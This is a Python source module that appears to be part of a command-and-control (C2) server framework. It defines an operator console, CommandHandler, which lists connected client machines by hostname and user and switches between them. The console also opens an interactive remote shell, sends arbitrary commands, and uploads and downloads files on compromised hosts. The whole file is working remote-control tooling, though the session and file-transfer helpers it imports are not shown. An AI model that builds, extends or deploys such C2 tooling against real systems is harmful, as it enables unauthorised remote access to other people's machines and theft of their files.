import logging
import os
import threading
import sys
import shlex
from typing import Dict, Optional, List, Any
import json
import time

from ..session.client_session import ClientSession
from ..utils.file_transfer import FileTransfer

logger = logging.getLogger('c2.cli')

class CommandHandler:
    """CLI interface for C2 server"""
    
    def __init__(self, config: dict):
        self.config = config
        self.clients: Dict[str, ClientSession] = {}
        self.current_client_id = None
        self.running = False
        self.file_transfer = FileTransfer(config.get('download_dir', 'data/downloads'))
        
    def start(self):
        """Start the command interface"""
        self.running = True
        logger.info("Command interface started")
        
        print("\nC2 Server Command Interface")
        print("Type 'help' for available commands")
        
        while self.running:
            try:
                cmd_line = input(self._get_prompt())
                if not cmd_line.strip():
                    continue
                    
                self._process_command(cmd_line)
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except EOFError:
                print("\nExiting command interface")
                self.running = False
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"Error: {str(e)}")
    
    def stop(self):
        """Stop the command interface"""
        self.running = False
        
    def register_client(self, client: ClientSession):
        """Register a new client"""
        self.clients[client.id] = client
        
        # If this is the first client, make it the current one
        if not self.current_client_id:
            self.current_client_id = client.id
            
        # Notify about new client
        print(f"\nNew client connected: {client}")
        print(f"{self._get_prompt()}", end="", flush=True)
    
    def _get_prompt(self):
        """Get the command prompt string"""
        if self.current_client_id and self.current_client_id in self.clients:
            client = self.clients[self.current_client_id]
            return f"c2({client.hostname})> "
        return "c2> "
    
    def _process_command(self, cmd_line: str):
        """Process a command line input"""
        # Split the command with proper handling of quotes
        try:
            args = shlex.split(cmd_line)
        except Exception:
            args = cmd_line.split()
            
        if not args:
            return
            
        cmd = args[0].lower()
        
        # Local commands
        if cmd == "exit":
            print("Exiting command interface (server continues running)")
            self.running = False
            
        elif cmd == "help":
            self._show_help()
            
        elif cmd == "clients":
            self._list_clients()
            
        elif cmd == "use":
            if len(args) < 2:
                print("Usage: use <client_id>")
                return
            self._switch_client(args[1])
            
        elif cmd == "info":
            self._show_client_info()
            
        elif cmd == "shell":
            self._interactive_shell()
            
        elif cmd == "upload":
            if len(args) < 3:
                print("Usage: upload <local_file> <remote_path>")
                return
            self._upload_file(args[1], args[2])
            
        elif cmd == "download":
            if len(args) < 2:
                print("Usage: download <remote_file>")
                return
            self._download_file(args[1])
            
        # Send command to client
        else:
            response = self._send_command(cmd_line)
            if response:
                print(response)
    
    def _show_help(self):
        """Show help message"""
        print("\nAvailable commands:")
        print("  clients                    - List all connected clients")
        print("  use <id>                   - Switch to a specific client")
        print("  info                       - Show detailed info about current client")
        print("  shell                      - Enter interactive shell mode with current client")
        print("  upload <local> <remote>    - Upload a file to the client")
        print("  download <remote>          - Download a file from the client")
        print("  exit                       - Exit the command interface")
        print("  help                       - Show this help message")
        print("  <command>                  - Send a command to the current client")
    
    def _list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("No clients connected")
            return
            
        print("\nConnected clients:")
        print("-" * 70)
        print(f"{'ID':<4} {'Host':<15} {'User':<10} {'Address':<20} {'Transport':<8} {'Active'}")
        print("-" * 70)
        
        for i, (client_id, client) in enumerate(self.clients.items()):
            current = "*" if client_id == self.current_client_id else " "
            addr = f"{client.addr[0]}:{client.addr[1]}"
            status = "Yes" if client.is_active else "No"
            print(f"{current}{i:<3} {client.hostname:<15} {client.username:<10} {addr:<20} {client.transport_type:<8} {status}")
        print("-" * 70)
    
    def _switch_client(self, client_selector: str):
        """Switch the current client"""
        # Try to interpret as index first
        try:
            idx = int(client_selector)
            if idx < 0 or idx >= len(self.clients):
                print(f"Invalid client index: {idx}")
                return
                
            client_id = list(self.clients.keys())[idx]
            self.current_client_id = client_id
            client = self.clients[client_id]
            print(f"Switched to {client}")
            return
        except ValueError:
            pass
            
        # Try as client ID
        if client_selector in self.clients:
            self.current_client_id = client_selector
            client = self.clients[client_selector]
            print(f"Switched to {client}")
            return
            
        print(f"Client not found: {client_selector}")
    
    def _show_client_info(self):
        """Show detailed information about the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        info = client.to_dict()
        
        print("\nClient Information:")
        print("-" * 50)
        print(f"ID:           {info['id']}")
        print(f"Hostname:     {info['hostname']}")
        print(f"Username:     {info['username']}")
        print(f"OS:           {info['os_type']}")
        print(f"Address:      {info['addr']}")
        print(f"Transport:    {info['transport']}")
        print(f"Active:       {info['active']}")
        print(f"Connected:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['connect_time']))}")
        print(f"Last seen:    {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['last_seen']))}")
        print(f"Uptime:       {info['uptime']} seconds")
        
        if info['capabilities']:
            print(f"Capabilities: {', '.join(info['capabilities'])}")
        print("-" * 50)
    
    def _send_command(self, command: str) -> Optional[str]:
        """Send a command to the current client"""
        if not self.current_client_id:
            print("No client selected")
            return None
            
        if self.current_client_id not in self.clients:
            print("Selected client no longer connected")
            return None
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return None
            
        try:
            return client.send_command(command)
        except Exception as e:
            logger.error(f"Error sending command: {e}")
            print(f"Error: {str(e)}")
            return None
    
    def _interactive_shell(self):
        """Enter an interactive shell with the current client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return
            
        print(f"\nEntering interactive shell with {client}")
        print("Type 'exit' to return to the C2 console\n")
        
        while True:
            try:
                cmd = input(f"{client.username}@{client.hostname}$ ")
                if cmd.lower() == "exit":
                    print("Returning to C2 console")
                    break
                    
                response = client.send_command(cmd)
                if response:
                    print(response, end="")
                    
            except KeyboardInterrupt:
                print("\nUse 'exit' to return to the C2 console")
            except Exception as e:
                logger.error(f"Shell error: {e}")
                print(f"Error: {str(e)}")
                break
    
    def _upload_file(self, local_path: str, remote_path: str):
        """Upload a file to the client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return
            
        # Expand path if needed
        local_path = os.path.expanduser(local_path)
        
        # Prepare upload command
        success, command = self.file_transfer.prepare_upload_command(local_path, remote_path)
        if not success:
            print(command)  # Error message
            return
            
        try:
            print(f"Uploading {local_path} to {remote_path}...")
            response = client.send_command(command)
            
            if response.startswith("SUCCESS"):
                print(f"File uploaded successfully to {remote_path}")
            else:
                print(f"Upload failed: {response}")
                
        except Exception as e:
            logger.error(f"Upload error: {e}")
            print(f"Upload failed: {str(e)}")
    
    def _download_file(self, remote_path: str):
        """Download a file from the client"""
        if not self.current_client_id or self.current_client_id not in self.clients:
            print("No client selected")
            return
            
        client = self.clients[self.current_client_id]
        if not client.is_active:
            print("Selected client is not active")
            return
            
        try:
            command = self.file_transfer.prepare_download_command(remote_path)
            print(f"Downloading {remote_path}...")
            
            response = client.send_command(command)
            success, message, path = self.file_transfer.handle_download_response(client.id, response)
            
            if success:
                print(message)
            else:
                print(f"Download failed: {message}")
                
        except Exception as e:
            logger.error(f"Download error: {e}")
            print(f"Download failed: {str(e)}")